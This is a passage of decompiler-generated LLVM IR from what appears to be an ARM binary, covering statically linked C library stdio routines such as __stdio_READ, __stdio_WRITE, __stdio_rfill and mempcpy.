  %v0_181e4 = load i32, i32* @ip, align 4
  %v1_181e4 = trunc i32 %v0_181e4 to i16
  %v2_181e4 = load i32, i32* @r5, align 4
  %v3_181e4 = add i32 %v2_181e4, 16
  %v4_181e4 = inttoptr i32 %v3_181e4 to i16*
  store i16 %v1_181e4, i16* %v4_181e4, align 2
  %v0_181e8 = load i32, i32* @r7, align 4
  %v1_181e8 = add i32 %v0_181e8, 18
  %v2_181e8 = inttoptr i32 %v1_181e8 to i8*
  %v3_181e8 = load i8, i8* %v2_181e8, align 1
  %v4_181e8 = zext i8 %v3_181e8 to i32
  store i32 %v4_181e8, i32* @r3, align 4
  %v2_181ec = load i32, i32* @r5, align 4
  %v3_181ec = add i32 %v2_181ec, 18
  %v4_181ec = inttoptr i32 %v3_181ec to i8*
  store i8 %v3_181e8, i8* %v4_181ec, align 1
  %v0_181f0 = call i32 @memcpy()
  %v0_181f4 = load i32, i32* @r7, align 4
  %v1_181f4 = add i32 %v0_181f4, 16
  %v2_181f4 = inttoptr i32 %v1_181f4 to i16*
  %v3_181f4 = load i16, i16* %v2_181f4, align 2
  %v4_181f4 = zext i16 %v3_181f4 to i32
  %v0_181f8 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_181f8, i32* @r5, align 4
  %v2_181fc = add i32 %v4_181f4, %v0_181f4
  store i32 %v2_181fc, i32* @r7, align 4
  br label %dec_label_pc_18200

dec_label_pc_18200:                               ; preds = %dec_label_pc_18150, %dec_label_pc_181cc
  %v0_181d8 = phi i32 [ %tmp, %dec_label_pc_18150 ], [ %v0_181f8, %dec_label_pc_181cc ]
  %v0_181d0 = phi i32 [ %v1_18104, %dec_label_pc_18150 ], [ %v2_181fc, %dec_label_pc_181cc ]
  %v3_18204 = icmp ult i32 %v0_181d0, %v2_18150
  %v1_18208 = add i32 %v0_181d8, 19
  store i32 %v1_18208, i32* @r0, align 4
  %v1_1820c = add i32 %v0_181d0, 19
  store i32 %v1_1820c, i32* @r1, align 4
  br i1 %v3_18204, label %dec_label_pc_18170, label %dec_label_pc_18214.loopexit

dec_label_pc_18214.loopexit:                      ; preds = %dec_label_pc_18200
  %v0_18214.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_18214

dec_label_pc_18214:                               ; preds = %dec_label_pc_18214.loopexit, %dec_label_pc_18190
  %v1_18214 = phi i32 [ %v0_181d8, %dec_label_pc_18214.loopexit ], [ %v0_181a8, %dec_label_pc_18190 ]
  %v0_18214 = phi i32 [ %v0_18214.pre, %dec_label_pc_18214.loopexit ], [ %v1_181a8, %dec_label_pc_18190 ]
  %v2_18214 = sub i32 %v1_18214, %v0_18214
  store i32 %v2_18214, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18218

dec_label_pc_18218:                               ; preds = %dec_label_pc_18148, %dec_label_pc_181b0, %dec_label_pc_1812c, %dec_label_pc_18214
  %v0_18218 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v6_180ec, i32* @r5, align 4
  store i32 %v12_180ec, i32* @r7, align 4
  ret i32 %v0_18218

; uselistorder directives
  uselistorder i32 %v0_181d0, { 5, 6, 4, 2, 3, 0, 1 }
  uselistorder i32 %v0_181d8, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v1_18104, { 1, 2, 0 }
  uselistorder i32 %tmp, { 0, 1, 3, 2, 4 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 6, 1, 2, 3, 4, 5, 7, 0 }
  uselistorder i32 19, { 7, 8, 0, 3, 9, 10, 11, 4, 5, 6, 1, 12, 2, 13 }
  uselistorder i32 18, { 5, 6, 4, 7, 0, 8, 1, 9, 2, 10, 3, 11 }
  uselistorder i32 22, { 1, 0, 11, 2, 3, 4, 5, 6, 12, 13, 7, 8, 9, 10 }
  uselistorder i32* @sp, { 2, 3, 0, 4, 1 }
  uselistorder i32 -8, { 38, 17, 18, 19, 20, 21, 22, 16, 15, 10, 14, 13, 12, 11, 23, 24, 25, 26, 27, 9, 40, 28, 29, 30, 31, 32, 39, 41, 33, 42, 37, 34, 35, 36, 8, 0, 1, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 %arg1, { 2, 1, 4, 0, 3 }
  uselistorder label %dec_label_pc_18218, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_18200, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r2, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_18230 = load i32, i32* @r4, align 4
  store i32 %v3_18230, i32* %stack_var_-12, align 4
  %v0_18234 = load i32, i32* %r0.global-to-local, align 4
  %v1_18234 = inttoptr i32 %v0_18234 to i16*
  %v2_18234 = load i16, i16* %v1_18234, align 2
  %v3_18234 = zext i16 %v2_18234 to i32
  store i32 %v3_18234, i32* @r3, align 4
  %v1_18238 = and i32 %v3_18234, 4
  store i32 %v1_18238, i32* @r5, align 4
  %v2_18238 = icmp eq i32 %v1_18238, 0
  store i32 %v0_18234, i32* @r4, align 4
  br i1 %v2_18238, label %dec_label_pc_1824c, label %bb

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread7

dec_label_pc_1824c:                               ; preds = %entry
  %v1_1824c = icmp slt i32 %arg2, 0
  br i1 %v1_1824c, label %bb18, label %bb19

bb18:                                             ; preds = %dec_label_pc_1824c
  store i32 2147483647, i32* @r2, align 4
  br label %bb19

bb19:                                             ; preds = %dec_label_pc_1824c, %bb18
  %v1_18254 = add i32 %v0_18234, 4
  %v2_18254 = inttoptr i32 %v1_18254 to i32*
  %v3_18254 = load i32, i32* %v2_18254, align 4
  store i32 %v3_18254, i32* %r0.global-to-local, align 4
  %v1_18258 = call i32 @__libc_read(i32 %v3_18254)
  store i32 %v1_18258, i32* %r0.global-to-local, align 4
  %v5_18260 = icmp sgt i32 %v1_18258, 0
  br i1 %v5_18260, label %.thread7, label %dec_label_pc_18264

dec_label_pc_18264:                               ; preds = %bb19
  %v2_1825c = icmp eq i32 %v1_18258, 0
  %v0_18264 = load i32, i32* @r4, align 4
  %v1_18264 = inttoptr i32 %v0_18264 to i16*
  %v2_18264 = load i16, i16* %v1_18264, align 2
  br i1 %v2_1825c, label %bb20, label %bb21

bb20:                                             ; preds = %dec_label_pc_18264
  %v2_18268 = or i16 %v2_18264, 4
  store i16 %v2_18268, i16* %v1_18264, align 2
  %v1_18284.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread7

bb21:                                             ; preds = %dec_label_pc_18264
  %v2_1826c = or i16 %v2_18264, 8
  store i16 %v2_1826c, i16* %v1_18264, align 2
  %v1_18278 = load i32, i32* @r5, align 4
  store i32 %v1_18278, i32* %r0.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %bb20, %bb, %bb19, %bb21
  %v1_18284 = phi i32 [ %v1_18284.pre, %bb20 ], [ 0, %bb ], [ %v1_18258, %bb19 ], [ %v1_18278, %bb21 ]
  %v2_18280 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_18280, i32* @r4, align 4
  ret i32 %v1_18284

; uselistorder directives
  uselistorder i16 %v2_18264, { 1, 0 }
  uselistorder i32 %v1_18258, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 2, 5, 6, 3, 4, 0, 1 }
  uselistorder i32 (i32)* @__libc_read, { 4, 2, 3, 0, 1 }
  uselistorder label %.thread7, { 3, 0, 2, 1 }
  uselistorder label %bb19, { 1, 0 }
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %arg3, i32* @r7, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 2147483647, i32* @r8, align 4
  %v2_1834c2 = icmp eq i32 %arg3, 0
  store i1 %v2_1834c2, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1834c2, label %dec_label_pc_18354, label %dec_label_pc_182a4

dec_label_pc_182a4:                               ; preds = %entry, %dec_label_pc_1834cthread-pre-split.dec_label_pc_182a4_crit_edge
  %v0_182b0 = phi i32 [ %v0_182b0.pre, %dec_label_pc_1834cthread-pre-split.dec_label_pc_182a4_crit_edge ], [ %tmp, %entry ]
  %v0_182ac = phi i32 [ %v5_182bc, %dec_label_pc_1834cthread-pre-split.dec_label_pc_182a4_crit_edge ], [ %arg2, %entry ]
  %v3_182a4 = phi i32 [ %v3_182a4.pre, %dec_label_pc_1834cthread-pre-split.dec_label_pc_182a4_crit_edge ], [ 2147483647, %entry ]
  %v0_182a8.in = phi i32 [ %v5_182c0, %dec_label_pc_1834cthread-pre-split.dec_label_pc_182a4_crit_edge ], [ %arg3, %entry ]
  %v3_182a8 = phi i32 [ %v5_182c0, %dec_label_pc_1834cthread-pre-split.dec_label_pc_182a4_crit_edge ], [ %arg3, %entry ]
  %v0_182a8 = icmp slt i32 %v0_182a8.in, 0
  %storemerge = select i1 %v0_182a8, i32 %v3_182a4, i32 %v3_182a8
  store i32 %storemerge, i32* @r2, align 4
  store i32 %v0_182ac, i32* %r1.global-to-local, align 4
  %v1_182b0 = add i32 %v0_182b0, 4
  %v2_182b0 = inttoptr i32 %v1_182b0 to i32*
  %v3_182b0 = load i32, i32* %v2_182b0, align 4
  %v3_182b4 = call i32 @__GI___libc_write(i32 %v3_182b0, i32 %v0_182ac)
  %v1_182b8 = icmp slt i32 %v3_182b4, 0
  %v2_182b8 = icmp eq i32 %v3_182b4, 0
  store i1 %v2_182b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_182b8, label %dec_label_pc_182c8, label %dec_label_pc_1834cthread-pre-split

dec_label_pc_182c8:                               ; preds = %dec_label_pc_182a4
  %v0_182c8 = load i32, i32* @r4, align 4
  %v1_182c8 = inttoptr i32 %v0_182c8 to i16*
  %v2_182c8 = load i16, i16* %v1_182c8, align 2
  %v1_182cc = or i16 %v2_182c8, 8
  store i16 %v1_182cc, i16* %v1_182c8, align 2
  store i32 40776, i32* %r3.global-to-local, align 4
  %v0_182d8 = call i32 @__aeabi_read_tp()
  %v3_182dc = load i16, i16* @global_var_2222c.358, align 2
  %v4_182dc = sext i16 %v3_182dc to i32
  store i32 %v4_182dc, i32* %r3.global-to-local, align 4
  %v2_182e0 = add i32 %v4_182dc, %v0_182d8
  %v3_182e0 = inttoptr i32 %v2_182e0 to i32*
  %v4_182e0 = load i32, i32* %v3_182e0, align 4
  store i32 %v4_182e0, i32* %r3.global-to-local, align 4
  %v7_182e4 = icmp eq i32 %v4_182e0, 4
  store i1 %v7_182e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_182e4, label %dec_label_pc_182f0, label %bb21

bb21:                                             ; preds = %dec_label_pc_182c8
  %v8_182e8 = icmp eq i32 %v4_182e0, 11
  store i1 %v8_182e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_182e8, label %dec_label_pc_182f0, label %dec_label_pc_18354

dec_label_pc_182f0:                               ; preds = %dec_label_pc_182c8, %bb21
  %v0_182f0 = load i32, i32* @r4, align 4
  %v1_182f0 = add i32 %v0_182f0, 8
  store i32 %v1_182f0, i32* %r2.global-to-local, align 4
  %v1_182f4 = inttoptr i32 %v1_182f0 to i32*
  %v2_182f4 = load i32, i32* %v1_182f4, align 4
  store i32 %v2_182f4, i32* %r2.global-to-local, align 4
  %v3_182f4 = add i32 %v0_182f0, 12
  %v4_182f4 = inttoptr i32 %v3_182f4 to i32*
  %v5_182f4 = load i32, i32* %v4_182f4, align 4
  store i32 %v5_182f4, i32* %r3.global-to-local, align 4
  %v2_182f8 = sub i32 %v5_182f4, %v2_182f4
  store i32 %v2_182f8, i32* %r1.global-to-local, align 4
  %v9_182f8 = icmp eq i32 %v5_182f4, %v2_182f4
  store i1 %v9_182f8, i1* %cpsr_z.global-to-local, align 1
  %v0_18344.pre = load i32, i32* @r5, align 4
  br i1 %v9_182f8, label %dec_label_pc_18344, label %dec_label_pc_18300

dec_label_pc_18300:                               ; preds = %dec_label_pc_182f0
  %v3_18300 = icmp ult i32 %v2_182f8, %v0_18344.pre
  %v9_18300 = icmp eq i32 %v2_182f8, %v0_18344.pre
  store i1 %v9_18300, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_18300, label %.preheader, label %bb22

bb22:                                             ; preds = %dec_label_pc_18300
  store i32 %v0_18344.pre, i32* %r1.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_18300, %bb22, %dec_label_pc_18328
  %v2_18314 = phi i32 [ %v1_1832c, %dec_label_pc_18328 ], [ %v2_182f4, %bb22 ], [ %v2_182f4, %dec_label_pc_18300 ]
  %v0_18308 = load i32, i32* @r6, align 4
  %v1_18308 = inttoptr i32 %v0_18308 to i8*
  %v2_18308 = load i8, i8* %v1_18308, align 1
  %v3_18308 = zext i8 %v2_18308 to i32
  store i32 %v3_18308, i32* %r3.global-to-local, align 4
  %v7_1830c = icmp eq i8 %v2_18308, 10
  store i1 %v7_1830c, i1* %cpsr_z.global-to-local, align 1
  %v1_18310 = add i32 %v0_18308, 1
  store i32 %v1_18310, i32* @r6, align 4
  %v3_18314 = inttoptr i32 %v2_18314 to i8*
  store i8 %v2_18308, i8* %v3_18314, align 1
  %v0_18318 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18318, label %dec_label_pc_1831c, label %dec_label_pc_18328

dec_label_pc_1831c:                               ; preds = %.preheader
  %v0_1831c = load i32, i32* @r4, align 4
  %v1_1831c = inttoptr i32 %v0_1831c to i16*
  %v2_1831c = load i16, i16* %v1_1831c, align 2
  %v3_1831c = zext i16 %v2_1831c to i32
  store i32 %v3_1831c, i32* %r3.global-to-local, align 4
  %v1_18320 = and i32 %v3_1831c, 256
  %v2_18320 = icmp eq i32 %v1_18320, 0
  store i1 %v2_18320, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18320, label %dec_label_pc_18328, label %dec_label_pc_1831c.dec_label_pc_18334_crit_edge

dec_label_pc_1831c.dec_label_pc_18334_crit_edge:  ; preds = %dec_label_pc_1831c
  %v0_18338.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18334

dec_label_pc_18328:                               ; preds = %dec_label_pc_1831c, %.preheader
  %v0_18328 = load i32, i32* %r1.global-to-local, align 4
  %v1_18328 = add i32 %v0_18328, -1
  store i32 %v1_18328, i32* %r1.global-to-local, align 4
  %v7_18328 = icmp eq i32 %v0_18328, 1
  store i1 %v7_18328, i1* %cpsr_z.global-to-local, align 1
  %v0_1832c = load i32, i32* %r2.global-to-local, align 4
  %v1_1832c = add i32 %v0_1832c, 1
  store i32 %v1_1832c, i32* %r2.global-to-local, align 4
  br i1 %v7_18328, label %dec_label_pc_18328.dec_label_pc_18334_crit_edge, label %.preheader

dec_label_pc_18328.dec_label_pc_18334_crit_edge:  ; preds = %dec_label_pc_18328
  %v0_18334.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_18334

dec_label_pc_18334:                               ; preds = %dec_label_pc_1831c.dec_label_pc_18334_crit_edge, %dec_label_pc_18328.dec_label_pc_18334_crit_edge
  %v0_18338 = phi i32 [ %v1_1832c, %dec_label_pc_18328.dec_label_pc_18334_crit_edge ], [ %v0_18338.pre, %dec_label_pc_1831c.dec_label_pc_18334_crit_edge ]
  %v0_18334 = phi i32 [ %v0_18334.pre, %dec_label_pc_18328.dec_label_pc_18334_crit_edge ], [ %v0_1831c, %dec_label_pc_1831c.dec_label_pc_18334_crit_edge ]
  %v1_18334 = add i32 %v0_18334, 8
  %v2_18334 = inttoptr i32 %v1_18334 to i32*
  %v3_18334 = load i32, i32* %v2_18334, align 4
  store i32 %v3_18334, i32* %r3.global-to-local, align 4
  %v2_18338 = add i32 %v0_18334, 16
  %v3_18338 = inttoptr i32 %v2_18338 to i32*
  store i32 %v0_18338, i32* %v3_18338, align 4
  %v0_1833c = load i32, i32* %r3.global-to-local, align 4
  %v1_1833c = load i32, i32* %r2.global-to-local, align 4
  %v2_1833c = sub i32 %v1_1833c, %v0_1833c
  store i32 %v2_1833c, i32* %r3.global-to-local, align 4
  %v1_18340 = load i32, i32* @r5, align 4
  %v2_18340 = sub i32 %v1_18340, %v2_1833c
  br label %dec_label_pc_18344

dec_label_pc_18344:                               ; preds = %dec_label_pc_182f0, %dec_label_pc_18334
  %v0_18344 = phi i32 [ %v2_18340, %dec_label_pc_18334 ], [ %v0_18344.pre, %dec_label_pc_182f0 ]
  %v1_18344 = load i32, i32* @r7, align 4
  %v2_18344 = sub i32 %v1_18344, %v0_18344
  store i32 %v2_18344, i32* @r7, align 4
  br label %dec_label_pc_18354

dec_label_pc_1834cthread-pre-split:               ; preds = %dec_label_pc_182a4
  %v3_182bc = load i32, i32* @r6, align 4
  %v5_182bc = add i32 %v3_182bc, %v3_182b4
  store i32 %v5_182bc, i32* @r6, align 4
  %v4_182c0 = load i32, i32* @r5, align 4
  %v5_182c0 = sub i32 %v4_182c0, %v3_182b4
  store i32 %v5_182c0, i32* @r5, align 4
  %v2_1834c = icmp eq i32 %v5_182c0, 0
  store i1 %v2_1834c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1834c, label %dec_label_pc_18354, label %dec_label_pc_1834cthread-pre-split.dec_label_pc_182a4_crit_edge

dec_label_pc_1834cthread-pre-split.dec_label_pc_182a4_crit_edge: ; preds = %dec_label_pc_1834cthread-pre-split
  %v3_182a4.pre = load i32, i32* @r8, align 4
  %v0_182b0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_182a4

dec_label_pc_18354:                               ; preds = %dec_label_pc_1834cthread-pre-split, %entry, %bb21, %dec_label_pc_18344
  %v0_18354 = load i32, i32* @r7, align 4
  ret i32 %v0_18354

; uselistorder directives
  uselistorder i32 %v5_182c0, { 1, 3, 0, 2 }
  uselistorder i32 %v5_182bc, { 1, 0 }
  uselistorder i32 %v0_18334, { 1, 0 }
  uselistorder i32 %v1_1832c, { 0, 2, 1 }
  uselistorder i32 %v0_18328, { 1, 0 }
  uselistorder i32 %v0_18344.pre, { 0, 3, 1, 2 }
  uselistorder i32 %v5_182f4, { 1, 0, 2 }
  uselistorder i32 %v2_182f4, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v3_182b4, { 1, 0, 2, 3 }
  uselistorder i32 %v0_182ac, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 3, 4, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 3, 2, 4, 5, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 10, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i8 10, { 2, 3, 0, 1 }
  uselistorder i32 11, { 12, 9, 10, 11, 19, 26, 27, 3, 4, 5, 13, 14, 15, 6, 16, 0, 17, 18, 20, 21, 7, 22, 8, 23, 1, 24, 2, 25, 28 }
  uselistorder i32 (i32, i32)* @__GI___libc_write, { 2, 1, 0 }
  uselistorder i32 2147483647, { 1, 6, 7, 0, 2, 3, 4, 5 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_18354, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_18344, { 1, 0 }
  uselistorder label %dec_label_pc_18334, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_182f0, { 1, 0 }
  uselistorder label %dec_label_pc_182a4, { 1, 0 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_18364 = load i32, i32* @r4, align 4
  store i32 %v3_18364, i32* %stack_var_-8, align 4
  %v1_18368 = add i32 %arg1, 8
  %v1_1836c = inttoptr i32 %v1_18368 to i32*
  %v2_1836c = load i32, i32* %v1_1836c, align 4
  store i32 %v2_1836c, i32* @r1, align 4
  %v3_1836c = add i32 %arg1, 12
  %v4_1836c = inttoptr i32 %v3_1836c to i32*
  %v5_1836c = load i32, i32* %v4_1836c, align 4
  %v2_18370 = sub i32 %v5_1836c, %v2_1836c
  store i32 %v2_18370, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v3_18378 = inttoptr i32 %arg1 to i16*
  %v4_18378 = call i32 @__stdio_READ(i16* %v3_18378, i32 %v2_1836c, i32 %v2_18370)
  %v0_1837c = load i32, i32* @r4, align 4
  %v1_1837c = add i32 %v0_1837c, 8
  %v2_1837c = inttoptr i32 %v1_1837c to i32*
  %v3_1837c = load i32, i32* %v2_1837c, align 4
  store i32 %v3_1837c, i32* %r2.global-to-local, align 4
  %v2_18380 = add i32 %v3_1837c, %v4_18378
  %v2_18384 = add i32 %v0_1837c, 20
  %v3_18384 = inttoptr i32 %v2_18384 to i32*
  store i32 %v2_18380, i32* %v3_18384, align 4
  %v0_18388 = load i32, i32* %r2.global-to-local, align 4
  %v1_18388 = load i32, i32* @r4, align 4
  %v2_18388 = add i32 %v1_18388, 16
  %v3_18388 = inttoptr i32 %v2_18388 to i32*
  store i32 %v0_18388, i32* %v3_18388, align 4
  %v2_1838c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1838c, i32* @r4, align 4
  ret i32 %v4_18378

; uselistorder directives
  uselistorder i32 %v4_18378, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
}

define i32 @__stdio_trans2r_o() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_18394 = load i32, i32* @r4, align 4
  store i32 %v3_18394, i32* %stack_var_-12, align 4
  %v0_18398 = load i32, i32* @r0, align 4
  %v1_18398 = inttoptr i32 %v0_18398 to i16*
  %v2_18398 = load i16, i16* %v1_18398, align 2
  %v3_18398 = zext i16 %v2_18398 to i32
  store i32 %v3_18398, i32* %r3.global-to-local, align 4
  %v0_1839c = load i32, i32* @r1, align 4
  %v2_1839c = and i32 %v0_1839c, %v3_18398
  %v4_1839c = icmp eq i32 %v2_1839c, 0
  store i32 %v0_18398, i32* @r4, align 4
  br i1 %v4_1839c, label %dec_label_pc_183ac, label %dec_label_pc_183bc

dec_label_pc_183ac:                               ; preds = %entry
  %v1_183ac = and i32 %v3_18398, 2176
  %v2_183ac = icmp eq i32 %v1_183ac, 0
  br i1 %v2_183ac, label %dec_label_pc_183b4, label %dec_label_pc_183c8

dec_label_pc_183b4:                               ; preds = %dec_label_pc_183ac
  %v2_183b4 = or i32 %v0_1839c, %v3_18398
  store i32 %v2_183b4, i32* %r3.global-to-local, align 4
  %v1_183b8 = trunc i32 %v2_183b4 to i16
  store i16 %v1_183b8, i16* %v1_18398, align 2
  %v0_183bc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_183bc

dec_label_pc_183bc:                               ; preds = %entry, %dec_label_pc_183b4
  %v0_183bc = phi i32 [ %v0_18398, %entry ], [ %v0_183bc.pre, %dec_label_pc_183b4 ]
  %v1_183bc = inttoptr i32 %v0_183bc to i16*
  %v2_183bc = load i16, i16* %v1_183bc, align 2
  %v3_183bc = zext i16 %v2_183bc to i32
  store i32 %v3_183bc, i32* %r3.global-to-local, align 4
  %v1_183c0 = and i32 %v3_183bc, 16
  store i32 %v1_183c0, i32* %r5.global-to-local, align 4
  %v2_183c0 = icmp eq i32 %v1_183c0, 0
  br i1 %v2_183c0, label %dec_label_pc_183f0, label %dec_label_pc_183c8

dec_label_pc_183c8:                               ; preds = %dec_label_pc_183ac, %dec_label_pc_183bc
  store i32 40532, i32* %r3.global-to-local, align 4
  %v0_183cc = call i32 @__aeabi_read_tp()
  store i32 %v0_183cc, i32* %r0.global-to-local, align 4
  %v3_183d0 = load i16, i16* @global_var_2222c.358, align 2
  %v4_183d0 = sext i16 %v3_183d0 to i32
  store i32 %v4_183d0, i32* %r3.global-to-local, align 4
  %v3_183d8 = add i32 %v4_183d0, %v0_183cc
  %v4_183d8 = inttoptr i32 %v3_183d8 to i32*
  store i32 9, i32* %v4_183d8, align 4
  br label %dec_label_pc_183dc

dec_label_pc_183dc:                               ; preds = %dec_label_pc_183f8, %dec_label_pc_183c8
  %v0_183dc = load i32, i32* @r4, align 4
  %v1_183dc = inttoptr i32 %v0_183dc to i16*
  %v2_183dc = load i16, i16* %v1_183dc, align 2
  %v3_183dc = zext i16 %v2_183dc to i32
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_183e4 = or i32 %v3_183dc, 8
  store i32 %v1_183e4, i32* %r3.global-to-local, align 4
  %v1_183e8 = trunc i32 %v1_183e4 to i16
  store i16 %v1_183e8, i16* %v1_183dc, align 2
  %v1_18430.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18428

dec_label_pc_183f0:                               ; preds = %dec_label_pc_183bc
  %v1_183f0 = and i32 %v3_183bc, 64
  %v2_183f0 = icmp eq i32 %v1_183f0, 0
  br i1 %v2_183f0, label %dec_label_pc_18418, label %dec_label_pc_183f8

dec_label_pc_183f8:                               ; preds = %dec_label_pc_183f0
  %v0_183f8 = load i32, i32* @r0, align 4
  %v1_183f8 = call i32 @__stdio_wcommit(i32 %v0_183f8)
  store i32 %v1_183f8, i32* %r0.global-to-local, align 4
  %v2_183fc = icmp eq i32 %v1_183f8, 0
  br i1 %v2_183fc, label %dec_label_pc_18404, label %dec_label_pc_183dc

dec_label_pc_18404:                               ; preds = %dec_label_pc_183f8
  %v0_18404 = load i32, i32* @r4, align 4
  %v1_18404 = inttoptr i32 %v0_18404 to i16*
  %v2_18404 = load i16, i16* %v1_18404, align 2
  %v3_18404 = zext i16 %v2_18404 to i32
  store i32 %v3_18404, i32* %r3.global-to-local, align 4
  %v1_18408 = add i32 %v0_18404, 8
  %v2_18408 = inttoptr i32 %v1_18408 to i32*
  %v3_18408 = load i32, i32* %v2_18408, align 4
  %v1_1840c = and i32 %v3_18404, 65471
  store i32 %v1_1840c, i32* %r3.global-to-local, align 4
  %v2_18410 = add i32 %v0_18404, 28
  %v3_18410 = inttoptr i32 %v2_18410 to i32*
  store i32 %v3_18408, i32* %v3_18410, align 4
  %v0_18414 = load i32, i32* %r3.global-to-local, align 4
  %v1_18414 = trunc i32 %v0_18414 to i16
  %v2_18414 = load i32, i32* @r4, align 4
  %v3_18414 = inttoptr i32 %v2_18414 to i16*
  store i16 %v1_18414, i16* %v3_18414, align 2
  %v0_18418.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_18418

dec_label_pc_18418:                               ; preds = %dec_label_pc_183f0, %dec_label_pc_18404
  %v2_18420 = phi i32 [ %v0_183bc, %dec_label_pc_183f0 ], [ %v0_18418.pre, %dec_label_pc_18404 ]
  %v1_18418 = inttoptr i32 %v2_18420 to i16*
  %v2_18418 = load i16, i16* %v1_18418, align 2
  %v3_18418 = zext i16 %v2_18418 to i32
  %v1_1841c = or i32 %v3_18418, 1
  store i32 %v1_1841c, i32* %r3.global-to-local, align 4
  %v1_18420 = trunc i32 %v1_1841c to i16
  store i16 %v1_18420, i16* %v1_18418, align 2
  %v0_18424 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_18424, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18428

dec_label_pc_18428:                               ; preds = %dec_label_pc_183dc, %dec_label_pc_18418
  %v1_18430 = phi i32 [ %v1_18430.pre, %dec_label_pc_183dc ], [ %v0_18424, %dec_label_pc_18418 ]
  %v2_1842c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1842c, i32* @r4, align 4
  ret i32 %v1_18430

; uselistorder directives
  uselistorder i32 %v3_18398, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32 65471, { 2, 1, 0 }
  uselistorder i32 (i32)* @__stdio_wcommit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_18428, { 1, 0 }
  uselistorder label %dec_label_pc_18418, { 1, 0 }
  uselistorder label %dec_label_pc_183c8, { 1, 0 }
  uselistorder label %dec_label_pc_183bc, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r0, align 4
  %v3_18438 = load i32, i32* @r4, align 4
  %v6_18438 = load i32, i32* @r5, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_18448 = call i32 @memcpy()
  %v0_1844c = load i32, i32* @r5, align 4
  %v1_1844c = load i32, i32* @r4, align 4
  %v2_1844c = add i32 %v1_1844c, %v0_1844c
  store i32 %v3_18438, i32* @r4, align 4
  store i32 %v6_18438, i32* @r5, align 4
  ret i32 %v2_1844c
}

define i32 @__sigjmp_save() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_1845c = load i32, i32* @r1, align 4
  %v2_1845c = icmp eq i32 %v0_1845c, 0
  %v3_18460 = load i32, i32* @r4, align 4
  store i32 %v3_18460, i32* %stack_var_-8, align 4
